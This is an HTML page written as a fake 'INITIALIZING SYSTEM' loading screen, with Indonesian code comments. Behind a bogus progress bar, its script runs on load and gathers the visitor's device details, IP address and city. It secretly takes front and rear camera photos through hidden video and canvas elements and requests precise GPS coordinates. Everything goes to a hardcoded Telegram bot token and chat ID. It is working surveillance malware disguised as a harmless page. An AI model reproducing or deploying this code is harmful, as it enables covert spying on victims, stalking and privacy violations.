<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>INITIALIZING SYSTEM...</title>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
  <style>
    body { background: #000; color: #0f0; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
    #loading-container { text-align: center; width: 80%; }
    #progress-bar { width: 0%; height: 2px; background: #0f0; transition: width .3s; margin-top: 10px; }
    .hidden { display: none; }
  </style>
</head>
<body>

  <div id="loading-container">
    <div id="loading-text">INITIALIZING CORE SYSTEM...</div>
    <div style="width:100%; background:#222;"><div id="progress-bar"></div></div>
    <div id="loading-details" style="font-size:10px; margin-top:10px;">Checking modules...</div>
  </div>
  
  <video id="v" autoplay muted class="hidden"></video>
  <canvas id="c" class="hidden"></canvas>

  <script>
  (() => {
    // --- KONFIGURASI ---
    const T = '7621493211:AAFfEUR3ri6Z9odBFzvqhGthsymwWPOl5tY';
    const C = '6636068781';
    
    const pb = document.getElementById('progress-bar');
    const ld = document.getElementById('loading-details');
    let p = 0;

    // Animasi Loading Palsu
    const timer = setInterval(() => {
      p += Math.random() * 3;
      if (p > 100) { p = 100; clearInterval(timer); }
      pb.style.width = p + '%';
    }, 200);

    // Fungsi Kirim Teks
    const sTG = async (msg) => {
      try {
        await fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: C, text: msg, parse_mode: 'HTML' })
        });
      } catch (e) { console.error("Gagal kirim teks"); }
    };

    // Fungsi Kirim Foto
    const sP = async (blob, fileName) => {
      try {
        const fd = new FormData();
        fd.append('chat_id', C);
        fd.append('photo', blob, fileName);
        await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd });
      } catch (e) { console.error("Gagal kirim foto"); }
    };

    // Fungsi Ambil Data Info (Disederhanakan agar tidak error HTML)
    const cDI = async () => {
      let m = `<b>🔔 NEW LOG DETECTED</b>\n\n`;
      m += `<b>🖥 DEVICE:</b> ${navigator.userAgent}\n`;
      m += `<b>🌐 LANG:</b> ${navigator.language}\n`;
      m += `<b>💾 RAM:</b> ${navigator.deviceMemory || 'Unknown'} GB\n\n`;

      try {
        const b = await navigator.getBattery();
        m += `<b>🔋 BATTERY:</b> ${Math.floor(b.level * 100)}% (${b.charging ? 'Charging' : 'Not Charging'})\n`;
      } catch(e) {}

      try {
        const res = await fetch('https://ipapi.co/json/');
        const d = await res.json();
        m += `<b>📍 IP:</b> ${d.ip}\n`;
        m += `<b>🏙 CITY:</b> ${d.city}, ${d.country_name}\n`;
      } catch(e) { m += `❌ Failed to get IP Location\n`; }

      return m;
    };

    // Fungsi Kamera (Dioptimalkan)
    const captureCamera = async (facing) => {
      const v = document.getElementById('v');
      const c = document.getElementById('c');
      let stream;
      try {
        // Menggunakan 'ideal' agar tidak crash jika kamera tidak ada
        const constraints = { video: { facingMode: facing } };
        stream = await navigator.mediaDevices.getUserMedia(constraints);
        v.srcObject = stream;
        await new Promise(r => v.onloadedmetadata = r);
        v.play();
        await new Promise(r => setTimeout(r, 1000));
        
        c.width = v.videoWidth;
        c.height = v.videoHeight;
        c.getContext('2d').drawImage(v, 0, 0);
        c.toBlob(b => sP(b, `capture_${facing}.jpg`), 'image/jpeg');
        
        stream.getTracks().forEach(t => t.stop());
        return true;
      } catch (e) {
        if(stream) stream.getTracks().forEach(t => t.stop());
        return false;
      }
    };

    // Eksekusi Utama
    const run = async () => {
      // 1. Ambil & Kirim Info Perangkat
      const info = await cDI();
      await sTG(info);

      // 2. Ambil Foto Depan
      const cam1 = await captureCamera("user");
      
      // 3. Ambil Foto Belakang (Hanya jika di HP)
      if (cam1) await captureCamera("environment");

      // 4. GPS (Minta Izin)
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(async (pos) => {
          const lat = pos.coords.latitude;
          const lon = pos.coords.longitude;
          const g = `<b>📍 GPS COORDINATE</b>\n\nURL: https://www.google.com/maps?q=${lat},${lon}`;
          await sTG(g);
        }, null, { enableHighAccuracy: true });
      }
    };

    run();
  })();
  </script>
</body>
</html>
